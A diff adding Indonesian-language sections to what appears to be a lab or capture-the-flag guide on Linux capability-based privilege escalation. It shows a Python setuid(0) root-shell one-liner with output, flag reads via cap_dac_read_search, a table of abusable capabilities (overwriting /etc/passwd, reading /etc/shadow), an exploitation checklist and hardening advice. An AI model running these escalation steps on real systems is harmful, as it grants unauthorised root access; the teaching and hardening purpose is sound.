@@ -85,3 +85,104 @@ node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "i
 | `perl` | `cap_setuid=ep` | `setuid(0)` + `exec "/bin/sh"` |
 | `ruby` | `cap_setuid=ep` | `Process.setuid(0)` + `exec` |
 | `node` | `cap_setuid=ep` | `setuid(0)` + `spawn("/bin/sh")` |
+
+
+---
+
+## Contoh Eksploitasi — cap_dac_read_search (Tanpa Shell)
+
+```bash
+getcap /usr/bin/cat   # → cat cap_dac_read_search=ep
+cat /root/flag.txt    # → bisa baca langsung walau bukan root
+```
+
+| Binary | Capability | Teknik |
+|--------|------------|--------|
+| `cat` | `cap_dac_read_search=ep` | Baca berkas apa pun tanpa shell |
+| `cp` | `cap_dac_read_search=ep` | Salin berkas apa pun walau bukan root |
+
+> `cap_setuid` mengubah uid proses menjadi 0 (root) — cukup panggil `setuid(0)` dari interpreter lalu spawn shell. Sementara `cap_dac_read_search` cukup untuk **membaca berkas apa pun** (misal flag) tanpa perlu shell sama sekali.
+
+---
+
+## Contoh Tampilan Eksploitasi (Root Shell)
+
+```text
+www-data@jobportal:~$ python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ whoami
+root
+$ cat /root/flag.txt
+FLAG{cap_setuid_python_to_root}
+```
+
+> **Capture:** Eksploitasi berhasil — `cap_setuid` memungkinkan Python memanggil `setuid(0)` sehingga shell berjalan penuh sebagai `uid=0(root)` tanpa SUID bit maupun sudo.
+
+Versi tanpa shell untuk `cap_dac_read_search`:
+
+```text
+www-data@jobportal:~$ getcap /usr/bin/cat
+/usr/bin/cat cap_dac_read_search=ep
+www-data@jobportal:~$ cat /root/flag.txt
+FLAG{dac_read_search_no_shell_needed}
+```
+
+> **Capture:** Dengan `cap_dac_read_search`, flag dapat dibaca **langsung tanpa shell** — permission berkas apa pun bisa dilewati.
+
+---
+
+## Capabilities Lain yang Perlu Diwaspadai
+
+| Capability | Dampak | Contoh Eksploitasi |
+|------------|--------|--------------------|
+| `cap_setgid` | Ganti gid ke grup mana pun (misal `shadow`) | Baca `/etc/shadow` |
+| `cap_dac_override` | Tulis/ubah berkas apa pun | Timpa `/etc/passwd` |
+| `cap_net_raw` | Craft paket mentah | Sniffing / spoofing jaringan |
+| `cap_sys_admin` | Hampir setara admin | Mount, namespace, ptrace |
+| `cap_sys_ptrace` | Inject kode ke proses root | Hijack proses berprivilege tinggi |
+
+---
+
+## Alur Eksploitasi
+
+```text
+getcap -r /
+    ↓
+Identifikasi capability berbahaya
+    ↓
+Cek GTFOBins → Capabilities
+    ↓
+Pilih interpreter yang sesuai
+    ↓
+Uji payload setuid(0) / spawn shell
+    ↓
+Verifikasi privilege dengan id
+```
+
+---
+
+## Pengerasan Keamanan (Hardening)
+
+- **Setel Ulang Capabilities** Hapus capability berbahaya dengan `setcap -r <binary>` dan batasi hanya untuk binary yang benar-benar membutuhkan.
+- **Batas Wajar Penggunaan** Berikan capability spesifik alih-alih root penuh — misal `cap_net_raw` untuk ping, jangan `cap_setuid` pada interpreter.
+- **Audit Rutin** Lakukan audit berkala dengan `getcap -r /` dan pastikan tidak ada capability berbahaya menempel pada interpreter.
+- **Hindari Interpreter** Jangan tempelkan `cap_setuid`/`cap_dac_override` pada interpreter (python, perl, ruby, node) karena semuanya bisa spawn shell.
+
+---
+
+## Checklist Capabilities LPE
+
+- [ ] Jalankan `getcap -r / 2>/dev/null`.
+- [ ] Identifikasi capability berbahaya (`cap_setuid`, `cap_dac_read_search`, `cap_dac_override`).
+- [ ] Cek di [GTFOBins](https://gtfobins.github.io) → bagian **Capabilities**.
+- [ ] Pilih payload shell yang sesuai dengan interpreter yang ditemukan.
+- [ ] Verifikasi dengan `id` → `uid=0(root)`.
+
+---
+
+## Referensi
+
+- [GTFOBins – Capabilities](https://gtfobins.github.io/)
+- [Linux Man Page – capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
